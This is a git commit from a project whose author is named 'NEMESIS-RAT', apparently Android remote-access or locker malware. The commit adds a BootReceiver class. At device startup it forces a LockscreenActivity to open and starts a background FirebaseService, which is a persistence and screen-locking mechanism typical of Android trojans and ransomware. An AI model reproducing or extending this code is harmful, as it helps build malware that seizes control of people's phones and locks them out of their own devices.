ecd933e3ecea2a46472390b9de00565edc8abc4d
NEMESIS-RAT <wwkwkk52@gmail.com>
2026-08-11 00:10:57 +0700

    Update BootReceiver.java

--- app/src/main/java/com/nemesis/BootReceiver.java
+++ app/src/main/java/com/nemesis/BootReceiver.java
@@ -1,1 +1,17 @@
+package com.nemesis;
 
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class BootReceiver extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Intent lock = new Intent(context, LockscreenActivity.class);
+            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(lock);
+            context.startService(new Intent(context, FirebaseService.class));
+        }
+    }
+}
